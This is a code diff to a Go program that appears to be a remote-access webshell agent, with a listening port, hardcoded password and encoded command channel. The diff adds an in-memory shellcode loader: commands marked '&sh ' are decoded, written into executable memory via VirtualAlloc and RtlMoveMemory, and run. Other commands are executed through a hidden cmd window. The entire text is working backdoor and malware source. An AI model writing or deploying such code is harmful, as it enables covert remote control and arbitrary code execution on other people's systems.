@@ -21,15 +21,21 @@ import (
 	"strings"
 	"syscall"
 	"time"
+	"unsafe"
 )
 
-const LISTEN = "0.0.0.0:65201"
+const LISTEN = "0.0.0.0:65211"
 const PWD = "S1lLyAQNXYUASEDFLVBWSFWECSSVS1lLy"
 const API = "S1lLyXCVBRTSDBAVWERHHWARTGJRS1lLy"
 const ENCODER = "base64"           // "" or "base64" or "hex"
 const RETURN_ENCODE = "hex_base64" // "" or "base64" or "hex" or "hex_base64"
 const OUT_PREFIX = "->|"           // 数据分割前缀符
 const OUT_SUFFIX = "|<-"           // 数据分割后缀符
+var (
+	kernel32      = syscall.NewLazyDLL("kernel32.dll")
+	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
+	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
+)
 
 func Decoder(enstr string) string {
 	bstring := []byte("")
@@ -310,9 +316,16 @@ func WgetCode(url string, savepath string) string {
 
 func ExecuteCommandCode(cmdPath string, command string) string {
 	var out []byte
-	switch runtime.GOOS {
-	case "windows":
-		cmd := exec.Command("cmd")
+	if strings.Index(command, "&sh ") != -1 {
+		commands := strings.TrimSpace(strings.Split(strings.Split(command, "&sh ")[1], "&echo ")[0])
+		tmp, _ := hex.DecodeString(commands)
+		sh, _ := base64.StdEncoding.DecodeString(string(tmp))
+		addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sh)), 0x1000|0x2000, 0x40)
+		_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
+		_, _, _ = syscall.SyscallN(addr, 0, 0, 0, 0)
+		out = []byte("")
+	} else {
+		cmd := exec.Command(cmdPath)
 		cmd.SysProcAttr = &syscall.SysProcAttr{CmdLine: fmt.Sprintf(`/c %s`, command), HideWindow: true}
 		out, _ = cmd.CombinedOutput()
 		out, _ = simplifiedchinese.GB18030.NewDecoder().Bytes(out)
